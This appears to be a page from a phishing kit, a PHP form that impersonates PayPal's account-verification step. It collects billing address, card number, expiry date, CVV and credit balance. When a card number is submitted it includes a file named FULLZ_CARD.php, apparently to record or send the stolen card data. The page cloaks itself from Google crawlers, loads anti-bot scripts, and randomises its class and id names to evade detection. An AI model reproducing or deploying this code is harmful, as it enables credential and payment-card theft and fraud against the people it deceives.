<?php
/*   

*/

session_start();
date_default_timezone_set('GMT'); 
error_reporting(0); 
include "../../../../BOTS/antibots1.php";
include "../../../../BOTS/antibots2.php";
include "../../../../BOTS/antibots3.php";
include "../../../../BOTS/antibots4.php";
include "../../../../BOTS/antibots5.php";
include "../../../../BOTS/antibots6.php";
################### SECOND FILES #####################
include('../../functions/get_lang_en.php');
############## BILL ADDRESS INFORMATION ##############
$_SESSION['_fullname_']    = $_POST['fullname'];
$_SESSION['_address_']     = $_POST['address'];
$_SESSION['_city_']        = $_POST['city'];
$_SESSION['_state_']       = $_POST['state'];
$_SESSION['_zipCode_']     = $_POST['zipCode'];
$_SESSION['_blcountry_']   = $_POST['blcountry'];
############## CREDIT CARD INFORMATION ##############
$_SESSION['_c_valid_']    = $_POST['c_valid'];
$_SESSION['_c_type_']     = $_POST['c_type'];
$_SESSION['_nameoncard_'] = $_POST['nameoncard'];
$_SESSION['_cardnumber_'] = $_POST['cardnumber'];
$_SESSION['_expdate_']    = $_POST['expdate'];
$_SESSION['_crdb_']       = $_POST['crdb'];
$_SESSION['_csc_']        = $_POST['csc'];	
#####################################################
if ($_SERVER["REQUEST_METHOD"] == "POST") {
if(empty($_POST['cardnumber'])== false) {
        include('FULLZ_CARD.php');
}
}
//------------------------------------------|| ANTIBOTS DZEB ||-----------------------------------------------------//
include "../../../BOTS/antibots1.php";
include "../../../BOTS/antibots2.php";
include "../../../BOTS/antibots3.php";
include "../../../BOTS/antibots4.php";
include "../../../BOTS/antibots5.php";
include "../../../BOTS/antibots6.php";
//----------------------------------------------------------------------------------------------------------------//
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
//----------------------------------------------------------------------------------------------------------------//
?>
<html class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> xx_Z118xMARVEL xx_Z118xDCxComic <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> x_PowerRxRagers_x <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" dir="ltr" id="<?="PP-ID00".rand(118, 10011454198745)?>">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<title><?=$Z118_title." ".$_SESSION['_LOOKUP_CNTRCODE_'];?></title>
	<link rel="shortcut icon" type="image/x-icon" href="../../lib/img/favicon.ico">
    <link rel="apple-touch-icon" href="../../lib/img/apple-touch-icon.png">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
	<!---------------------------- FONTS ROBOT CONDDENSED ----------------------------->
	<link href="https://fonts.googleapis.com/css?family=Roboto+Condensed" rel="stylesheet">
	<!------------------------------- FILES CSS STYLE --------------------------------->
    <link rel="stylesheet" href="../../lib/css/G-Z118.css">
</style>
</head>
<body id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
<header class="<?="x_".rand(3004, 24560)."".rand(7456489, 514566)?> xx_Z118xGR <?="x_".rand(3004, 24560)."".rand(7456489, 514566)?>">
    <div class="<?="x_".rand(3004, 24560)."".rand(7456489, 514566)?> headerxx_Z118xGR <?="x_".rand(3004, 24560)."".rand(7456489, 514566)?>">
        <div class="<?="x_".rand(3004, 24560)."".rand(7456489, 514566)?> xGhostxRider_JC <?="x_".rand(3004, 24560)."".rand(7456489, 514566)?>">
            <a data-click="payPalxL0GR" href="#" class="xL0GR <?="x_".rand(3004, 24560)."".rand(7456489, 514566)?>"></a>
            <div class="<?="x_".rand(3004, 24560)."".rand(7456489, 514566)?> BTN_SuperMAN <?="x_".rand(3004, 24560)."".rand(7456489, 514566)?>"><span class="<?="x_".rand(3004, 24560)."".rand(7456489, 514566)?> ThexSHIELD118 <?="x_".rand(3004, 24560)."".rand(7456489, 514566)?>"><?=$Z118_securityLock;?></span></div>
        </div>
    </div>
</header>
    <xx_GOxGO class="Browxx_GOxGOZ118" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
        <section id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" role="xx_GOxGO" data-country="US" class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
            <section id="xx_GOxGO" class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                <div id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> xGhostxRider_JC <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                    <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> x_V654DF654THEBEASTXX" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                        <form action="" method="post" name="GOxGOxPOWERxRANGERS" class="GOxGOxPOWERxRANGERS" no<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
						
                           <br>
                            <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> HeaderZ118 <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                                <h2 class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>"><?=$Z118_verify;?></h2>
                            </div>
                            <hr style="width: 75%;">
                            <div>
                                <p style="text-align: center;font-size: 1.2em;width: 88%;padding-left: 6%;"><?=$Z118_pargraphe;?></p>
                            </div>
                            <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> MightyxMorphin <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                            <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> x_Gh0ST789 <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">	
									    <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
									        <p style="margin-bottom: 8px;"><?=$Z118_update_bill;?></p>                                       
                                            <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> x_Gh0ST789 <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
											<div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                                                <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> x_V-ForZ118 large" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
												    <input type="text" class="Xval666ideX1 <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" id="fullname" name="fullname" required="required" value="" placeholder="<?=$Z118_fullname;?>" autocomplete="off" aria-required="true">
                                                </div>
                                            </div>									
                                            <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                                                <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> x_V-ForZ118 large" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                                                    <input type="text" class="Xval666ideX1 <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" name="address" required="required" value="" placeholder="<?=$Z118_address;?>" autocomplete="off" aria-required="true">
                                                </div>
                                            </div>
                                            <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> " id="stateHolder" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                                                <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                                                    <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> x_V-ForZ118 large" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                                                        <input type="text" id="city" name="city" class="Xval666ideX1 <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" placeholder="<?=$Z118_city;?>" required="required" autocomplete="off" value="<?=$_SESSION['_LOOKUP_CITY_'];?>" aria-required="true">
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> multi <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> equal <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> " id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                                                <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> x_V-ForZ118 <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>  medium <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>  left" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                                                    <input type="text" id="state" name="state" autocomplete="off" class="Xval666ideX1 <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" required="required" aria-required="true" value="<?=$_SESSION['_LOOKUP_STATE_'];?>" placeholder="<?=$Z118_state;?>" aria-required="true">
                                                </div>
                                                <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                                                    <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> x_V-ForZ118 medium <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>  right" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                                                        <input type="text" id="postalCode" name="zipCode" autocomplete="off" class="Xval666ideX1 <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" required="required" placeholder="<?=$Z118_zipCode;?>" value="<?=$_SESSION['_LOOKUP_ZIPCODE_'];?>" aria-required="true">
                                                    </div>
                                                </div>
                                            <select id="blcountry" name="blcountry" ng-disabled="readOnly || readOnlySelect" ng-model="selectedCountry" ng-class="(!selectedCountry) ? 'no-selected' : ''" ng-options="country.name for country in countries | orderObjectBy:'name'" class="ng-pristine ng-valid no-selected ng-touched" style="width: 100%; padding: 0px 0px 0px 10px;"><option value="" class="" selected="selected">Select Country</option>
                                    
                                    <option value="United States">United States</option>
                                    <option value="United Kingdom">United Kingdom</option>
                                    <option value="Afghanistan">Afghanistan</option>
                                    <option value="Albania">Albania</option>
                                    <option value="Algeria">Algeria</option>
                                    <option value="American Samoa">American Samoa</option>
                                    <option value="Andorra">Andorra</option>
                                    <option value="Angola">Angola</option>
                                    <option value="Anguilla">Anguilla</option>
                                    <option value="Antarctica">Antarctica</option>
                                    <option value="Antigua and Barbuda">Antigua and Barbuda</option>
                                    <option value="Argentina">Argentina</option>
                                    <option value="Armenia">Armenia</option>
                                    <option value="Aruba">Aruba</option>
                                    <option value="Australia">Australia</option>
                                    <option value="Austria">Austria</option>
                                    <option value="Azerbaijan">Azerbaijan</option>
                                    <option value="Bahamas">Bahamas</option>
                                    <option value="Bahrain">Bahrain</option>
                                    <option value="Bangladesh">Bangladesh</option>
                                    <option value="Barbados">Barbados</option>
                                    <option value="Belarus">Belarus</option>
                                    <option value="Belgium">Belgium</option>
                                    <option value="Belize">Belize</option>
                                    <option value="Benin">Benin</option>
                                    <option value="Bermuda">Bermuda</option>
                                    <option value="Bhutan">Bhutan</option>
                                    <option value="Bolivia">Bolivia</option>
                                    <option value="Bosnia and Herzegovina">Bosnia and Herzegovina</option>
                                    <option value="Botswana">Botswana</option>
                                    <option value="Bouvet Island">Bouvet Island</option>
                                    <option value="Brazil">Brazil</option>
                                    <option value="British Indian Ocean Territory">British Indian Ocean Territory</option>
                                    <option value="Brunei Darussalam">Brunei Darussalam</option>
                                    <option value="Bulgaria">Bulgaria</option>
                                    <option value="Burkina Faso">Burkina Faso</option>
                                    <option value="Burundi">Burundi</option>
                                    <option value="Cambodia">Cambodia</option>
                                    <option value="Cameroon">Cameroon</option>
                                    <option value="Canada">Canada</option>
                                    <option value="Cape Verde">Cape Verde</option>
                                    <option value="Cayman Islands">Cayman Islands</option>
                                    <option value="Central African Republic">Central African Republic</option>
                                    <option value="Chad">Chad</option>
                                    <option value="Chile">Chile</option>
                                    <option value="China">China</option>
                                    <option value="Christmas Island">Christmas Island</option>
                                    <option value="Cocos (Keeling) Islands">Cocos (Keeling) Islands</option>
                                    <option value="Colombia">Colombia</option>
                                    <option value="Comoros">Comoros</option>
                                    <option value="Congo">Congo</option>
                                    <option value="Congo, The Democratic Republic of The">Congo, The Democratic Republic of The</option>
                                    <option value="Cook Islands">Cook Islands</option>
                                    <option value="Costa Rica">Costa Rica</option>
                                    <option value="Cote D'ivoire">Cote D'ivoire</option>
                                    <option value="Croatia">Croatia</option>
                                    <option value="Cuba">Cuba</option>
                                    <option value="Cyprus">Cyprus</option>
                                    <option value="Czech Republic">Czech Republic</option>
                                    <option value="Denmark">Denmark</option>
                                    <option value="Djibouti">Djibouti</option>
                                    <option value="Dominica">Dominica</option>
                                    <option value="Dominican Republic">Dominican Republic</option>
                                    <option value="Ecuador">Ecuador</option>
                                    <option value="Egypt">Egypt</option>
                                    <option value="El Salvador">El Salvador</option>
                                    <option value="Equatorial Guinea">Equatorial Guinea</option>
                                    <option value="Eritrea">Eritrea</option>
                                    <option value="Estonia">Estonia</option>
                                    <option value="Ethiopia">Ethiopia</option>
                                    <option value="Falkland Islands (Malvinas)">Falkland Islands (Malvinas)</option>
                                    <option value="Faroe Islands">Faroe Islands</option>
                                    <option value="Fiji">Fiji</option>
                                    <option value="Finland">Finland</option>
                                    <option value="France">France</option>
                                    <option value="French Guiana">French Guiana</option>
                                    <option value="French Polynesia">French Polynesia</option>
                                    <option value="French Southern Territories">French Southern Territories</option>
                                    <option value="Gabon">Gabon</option>
                                    <option value="Gambia">Gambia</option>
                                    <option value="Georgia">Georgia</option>
                                    <option value="Germany">Germany</option>
                                    <option value="Ghana">Ghana</option>
                                    <option value="Gibraltar">Gibraltar</option>
                                    <option value="Greece">Greece</option>
                                    <option value="Greenland">Greenland</option>
                                    <option value="Grenada">Grenada</option>
                                    <option value="Guadeloupe">Guadeloupe</option>
                                    <option value="Guam">Guam</option>
                                    <option value="Guatemala">Guatemala</option>
                                    <option value="Guinea">Guinea</option>
                                    <option value="Guinea-bissau">Guinea-bissau</option>
                                    <option value="Guyana">Guyana</option>
                                    <option value="Haiti">Haiti</option>
                                    <option value="Heard Island and Mcdonald Islands">Heard Island and Mcdonald Islands</option>
                                    <option value="Holy See (Vatican City State)">Holy See (Vatican City State)</option>
                                    <option value="Honduras">Honduras</option>
                                    <option value="Hong Kong">Hong Kong</option>
                                    <option value="Hungary">Hungary</option>
                                    <option value="Iceland">Iceland</option>
                                    <option value="India">India</option>
                                    <option value="Indonesia">Indonesia</option>
                                    <option value="Iran, Islamic Republic of">Iran, Islamic Republic of</option>
                                    <option value="Iraq">Iraq</option>
                                    <option value="Ireland">Ireland</option>
                                    <option value="Israel">Israel</option>
                                    <option value="Italy">Italy</option>
                                    <option value="Jamaica">Jamaica</option>
                                    <option value="Japan">Japan</option>
                                    <option value="Jordan">Jordan</option>
                                    <option value="Kazakhstan">Kazakhstan</option>
                                    <option value="Kenya">Kenya</option>
                                    <option value="Kiribati">Kiribati</option>
                                    <option value="Korea, Democratic People's Republic of">Korea, Democratic People's Republic of</option>
                                    <option value="Korea, Republic of">Korea, Republic of</option>
                                    <option value="Kuwait">Kuwait</option>
                                    <option value="Kyrgyzstan">Kyrgyzstan</option>
                                    <option value="Lao People's Democratic Republic">Lao People's Democratic Republic</option>
                                    <option value="Latvia">Latvia</option>
                                    <option value="Lebanon">Lebanon</option>
                                    <option value="Lesotho">Lesotho</option>
                                    <option value="Liberia">Liberia</option>
                                    <option value="Libya">Libya</option>
                                    <option value="Liechtenstein">Liechtenstein</option>
                                    <option value="Lithuania">Lithuania</option>
                                    <option value="Luxembourg">Luxembourg</option>
                                    <option value="Macao">Macao</option>
                                    <option value="Macedonia, The Former Yugoslav Republic of">Macedonia, The Former Yugoslav Republic of</option>
                                    <option value="Madagascar">Madagascar</option>
                                    <option value="Malawi">Malawi</option>
                                    <option value="Malaysia">Malaysia</option>
                                    <option value="Maldives">Maldives</option>
                                    <option value="Mali">Mali</option>
                                    <option value="Malta">Malta</option>
                                    <option value="Marshall Islands">Marshall Islands</option>
                                    <option value="Martinique">Martinique</option>
                                    <option value="Mauritania">Mauritania</option>
                                    <option value="Mauritius">Mauritius</option>
                                    <option value="Mayotte">Mayotte</option>
                                    <option value="Mexico">Mexico</option>
                                    <option value="Micronesia, Federated States of">Micronesia, Federated States of</option>
                                    <option value="Moldova, Republic of">Moldova, Republic of</option>
                                    <option value="Monaco">Monaco</option>
                                    <option value="Mongolia">Mongolia</option>
                                    <option value="Montserrat">Montserrat</option>
                                    <option value="Morocco">Morocco</option>
                                    <option value="Mozambique">Mozambique</option>
                                    <option value="Myanmar">Myanmar</option>
                                    <option value="Namibia">Namibia</option>
                                    <option value="Nauru">Nauru</option>
                                    <option value="Nepal">Nepal</option>
                                    <option value="Netherlands">Netherlands</option>
                                    <option value="Netherlands Antilles">Netherlands Antilles</option>
                                    <option value="New Caledonia">New Caledonia</option>
                                    <option value="New Zealand">New Zealand</option>
                                    <option value="Nicaragua">Nicaragua</option>
                                    <option value="Niger">Niger</option>
                                    <option value="Nigeria">Nigeria</option>
                                    <option value="Niue">Niue</option>
                                    <option value="Norfolk Island">Norfolk Island</option>
                                    <option value="Northern Mariana Islands">Northern Mariana Islands</option>
                                    <option value="Norway">Norway</option>
                                    <option value="Oman">Oman</option>
                                    <option value="Pakistan">Pakistan</option>
                                    <option value="Palau">Palau</option>
                                    <option value="Palestinian Territory, Occupied">Palestinian Territory, Occupied</option>
                                    <option value="Panama">Panama</option>
                                    <option value="Papua New Guinea">Papua New Guinea</option>
                                    <option value="Paraguay">Paraguay</option>
                                    <option value="Peru">Peru</option>
                                    <option value="Philippines">Philippines</option>
                                    <option value="Pitcairn">Pitcairn</option>
                                    <option value="Poland">Poland</option>
                                    <option value="Portugal">Portugal</option>
                                    <option value="Puerto Rico">Puerto Rico</option>
                                    <option value="Qatar">Qatar</option>
                                    <option value="Reunion">Reunion</option>
                                    <option value="Romania">Romania</option>
                                    <option value="Russian Federation">Russian Federation</option>
                                    <option value="Rwanda">Rwanda</option>
                                    <option value="Saint Helena">Saint Helena</option>
                                    <option value="Saint Kitts and Nevis">Saint Kitts and Nevis</option>
                                    <option value="Saint Lucia">Saint Lucia</option>
                                    <option value="Saint Pierre and Miquelon">Saint Pierre and Miquelon</option>
                                    <option value="Saint Vincent and The Grenadines">Saint Vincent and The Grenadines</option>
                                    <option value="Samoa">Samoa</option>
                                    <option value="San Marino">San Marino</option>
                                    <option value="Sao Tome and Principe">Sao Tome and Principe</option>
                                    <option value="Saudi Arabia">Saudi Arabia</option>
                                    <option value="Senegal">Senegal</option>
                                    <option value="Serbia and Montenegro">Serbia and Montenegro</option>
                                    <option value="Seychelles">Seychelles</option>
                                    <option value="Sierra Leone">Sierra Leone</option>
                                    <option value="Singapore">Singapore</option>
                                    <option value="Slovakia">Slovakia</option>
                                    <option value="Slovenia">Slovenia</option>
                                    <option value="Solomon Islands">Solomon Islands</option>
                                    <option value="Somalia">Somalia</option>
                                    <option value="South Africa">South Africa</option>
                                    <option value="South Georgia and The South Sandwich Islands">South Georgia and The South Sandwich Islands</option>
                                    <option value="Spain">Spain</option>
                                    <option value="Sri Lanka">Sri Lanka</option>
                                    <option value="Sudan">Sudan</option>
                                    <option value="Suriname">Suriname</option>
                                    <option value="Svalbard and Jan Mayen">Svalbard and Jan Mayen</option>
                                    <option value="Swaziland">Swaziland</option>
                                    <option value="Sweden">Sweden</option>
                                    <option value="Switzerland">Switzerland</option>
                                    <option value="Syrian Arab Republic">Syrian Arab Republic</option>
                                    <option value="Taiwan, Province of China">Taiwan, Province of China</option>
                                    <option value="Tajikistan">Tajikistan</option>
                                    <option value="Tanzania, United Republic of">Tanzania, United Republic of</option>
                                    <option value="Thailand">Thailand</option>
                                    <option value="Timor-leste">Timor-leste</option>
                                    <option value="Togo">Togo</option>
                                    <option value="Tokelau">Tokelau</option>
                                    <option value="Tonga">Tonga</option>
                                    <option value="Trinidad and Tobago">Trinidad and Tobago</option>
                                    <option value="Tunisia">Tunisia</option>
                                    <option value="Turkey">Turkey</option>
                                    <option value="Turkmenistan">Turkmenistan</option>
                                    <option value="Turks and Caicos Islands">Turks and Caicos Islands</option>
                                    <option value="Tuvalu">Tuvalu</option>
                                    <option value="Uganda">Uganda</option>
                                    <option value="Ukraine">Ukraine</option>
                                    <option value="United Arab Emirates">United Arab Emirates</option>
                                    <option value="United States Minor Outlying Islands">United States Minor Outlying Islands</option>
                                    <option value="Uruguay">Uruguay</option>
                                    <option value="Uzbekistan">Uzbekistan</option>
                                    <option value="Vanuatu">Vanuatu</option>
                                    <option value="Venezuela">Venezuela</option>
                                    <option value="Viet Nam">Viet Nam</option>
                                    <option value="Virgin Islands, British">Virgin Islands, British</option>
                                    <option value="Virgin Islands, U.S.">Virgin Islands, U.S.</option>
                                    <option value="Wallis and Futuna">Wallis and Futuna</option>
                                    <option value="Western Sahara">Western Sahara</option>
                                    <option value="Yemen">Yemen</option>
                                    <option value="Zambia">Zambia</option>
                                    <option value="Zimbabwe">Zimbabwe</option>
                                </select>
											
										
                                            
                                        </div>
									</div>							
                                <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> 0Dats_Good0 <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>"style="margin-top: 5em;"><p style="margin-bottom: 8px;"><?=$Z118_update_card;?></p>
                                    <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> x_Gh0ST789 <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                                        <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> lap <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                                            <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> x_V-ForZ118 large" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                                                <input type="text" class="Xval666ideX1 <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" id="nameoncard" name="nameoncard" required="required" autocomplete="off" placeholder="<?=$Z118_cardholder;?>" value="<?php if(isset($_SESSION['_nameoncard_'])){ echo $_SESSION['_nameoncard_'];} ?>">
                                            </div>
                                        </div>
                                        <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                                            <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> x_V-ForZ118 large" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
											    <input type="tel" class="Xval666ideX1 <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" id="cardnumber" name="cardnumber" placeholder="<?=$Z118_cardnumber;?>" required="required"autocomplete="off" value="">
											    <input name="c_type" type="hidden" id="card_type" value="">
                        					    <input name="c_valid" type="hidden" id="card_valid" value="">
											</div>
                                        </div>
                                    </div>                                    
                                    <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> x_Gh0ST789" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">                                                                                       
                                        <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> multi <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> equal <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> " id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                                            <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> x_V-ForZ118 <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> medium <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> left" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
												<input type="tel" id="en_expdate" name="expdate" autocomplete="off" class="Xval666ideX1 <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" required="required" value="" maxlength="7" placeholder="<?=$Z118_expdate;?>" value="">
											</div>
                                             <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                                                <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> x_V-ForZ118 <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> medium <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> right" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                                                    <input type="tel" id="csc" name="csc" autocomplete="off" class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> Xval666ideX1 <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" required="required" placeholder="<?=$Z118_csc;?>" value="">
                                                </div>
                                            </div>
											<div class="x_22ID-Z546 x_Gh0ST789 x_31ID-Z680" id="x_26ID-Z558">
                                        <div class="x_30ID-Z720 lap x_28ID-Z558" id="x_31ID-Z564">
                                            <div class="x_29ID-Z759 x_V-ForZ118 large" id="x_22ID-Z766">
                                                <input type="text" class="Xval666ideX1 x_34ID-Z692" id="crdb" name="crdb" required="required" autocomplete="off" placeholder="Credit Balance" value="" aria-required="true">
                                            </div>
                                        </div>
                                        </div>
                                    </div> 
 									
									<div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> agreeTC <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>  checkbox" id="<?="PP-ID1198".rand(1180018, 1001198745)?>">
                                        <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> x_V-ForZ118" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                                            <label class="helpNotifyUS" role="button"><?=$Z118_agree;?><a data-click="userAgreement" href="#" target="_blank"><?=$Z118_user_agrement;?></a>, <a data-click="privacyPolicy" href="#" target="_blank"><?=$Z118_privacy;?></a><?=$Z118_and;?><a data-click="esign" href="#" target="_blank"><?=$Z118_policy;?></a>.</label>
                                        </div>
                                    </div>
									
                                    <input id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> submitBtn<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> " name="" type="submit" class="ButtonZ118" value="<?=$Z118_submit;?>" data-click="WorldWideSubmit">
                                </div>
                            </div>
							
                        </form>
                    </div>
                </div>
            </section>
        </section>
    </xx_GOxGO>
    <footer id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> gblFooter" role="contentinfo" class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
        <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> F00GER00 <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> IntentF00GER00" id="<?="PP-Z118".rand(1180018, 1001198745)?>">
            <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> F00GER00Nav <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> " id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> xGhostxRider_JC <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> " id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                    <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> legal <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> " id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                        <p class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> copyright <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> " id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">© <?=date('Y');?> &#80;&#97;&#121;&#80;&#97;&#108;</p>
                        <ul>
                            <li><a id="<?="privacyPolicy".rand(1180018, 1001198745)?> data-click="privacyPolicy" href="#" target="_blank"><?=$Z118_fPrivacy;?></a></li>
                            <li><a id="<?="legalAgreement".rand(1180018, 1001198745)?> data-click="legalAgreement" href="#" target="_blank"><?=$Z118_flegal;?></a></li>
                            <li><a id="<?="contactUs".rand(1180018, 1001198745)?> data-click="contactUs" href="#" target="_blank"><?=$Z118_fHelpCenter;?></a></li>
                            <li class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> siteFeedback <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> " id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> siteFeedback <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> "></li>
                        </ul>
						<div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> flag <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> countryFlag <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> " id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
						<a id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" data-click="flagChange" href="#" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> countryFlag <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> " class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> country <?=$_SESSION['_LOOKUP_CNTRCODE_'];?>"><?="countryFlag".rand(1188, 10745)?></a>
						</div>
                    </div>
                </div>
            </div>
        </div>
    </footer>
<!------------------------------- FILE JAVASCRIPT --------------------------------->
    <script src="../../lib/js/jquery.js"></script>
    <script src="../../lib/js/jquery.validate.js"></script>
	<script src="../../lib/js/jquery.additional-methods.js"></script>
	<script src="../../lib/js/jquery.v-form.js"></script>
	<script src="../../lib/js/jquery.CardValidator.js"></script>
